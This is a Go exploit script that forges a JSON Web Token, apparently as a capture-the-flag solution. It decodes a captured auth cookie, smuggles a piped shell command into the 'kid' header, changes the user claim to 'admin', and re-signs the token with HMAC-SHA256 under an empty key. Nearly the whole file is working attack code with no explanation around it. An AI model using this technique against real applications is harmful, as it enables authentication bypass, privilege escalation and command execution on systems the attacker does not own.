package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"strings"
)

func computeHS256(message, secret string) string {
	key := []byte(secret)
	h := hmac.New(sha256.New, key)
	h.Write([]byte(message))
	encoded := base64.URLEncoding.EncodeToString(h.Sum(nil))
	sig := strings.ReplaceAll(string(encoded), "=", "")
	fmt.Println("[*] New HMAC Signature:")
	fmt.Println(sig)
	return sig
}

// split token into header and payload
func parseToken(token string) ([]byte, []byte) {
	tmp := strings.Split(token, ".")
	header, _ := base64.RawStdEncoding.DecodeString(tmp[0])
	payload, _ := base64.RawStdEncoding.DecodeString(tmp[1])
	fmt.Println("[*] Original:")
	fmt.Println(string(header))
	fmt.Println(string(payload))
	return header, payload
}

// insert malicious values into token and return data for signing
func attackToken(header, payload []byte) string {
	mh := []byte(strings.ReplaceAll(string(header), "0001", "|/usr/local/bin/score 9d823daf-d840-46ab-a4d5-046d87e75eee"))
	mp := []byte(strings.ReplaceAll(string(payload), "null", "\"admin\""))
	fmt.Println("[*] Malicious Replacement:")
	fmt.Println(string(mh))
	fmt.Println(string(mp))
	eh := strings.ReplaceAll(base64.URLEncoding.EncodeToString(mh), "=", "")
	ep := strings.ReplaceAll(base64.URLEncoding.EncodeToString(mp), "=", "")
	data := strings.Join([]string{eh, ep}, ".")
	return data
}

func bakeNewToken(data string, sig string) string {
	combined := strings.Join([]string{data, sig}, ".")
	return combined
}

func main() {
	// known public key
	pub := make([]byte, 0)
	// auth cookie when logged in as "test"
	token := "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"

	h, p := parseToken(token)
	data := attackToken(h, p)
	sig := computeHS256(data, string(pub))
	res := bakeNewToken(data, sig)

	fmt.Println("[*] Final payload:")
	fmt.Println(res)

}
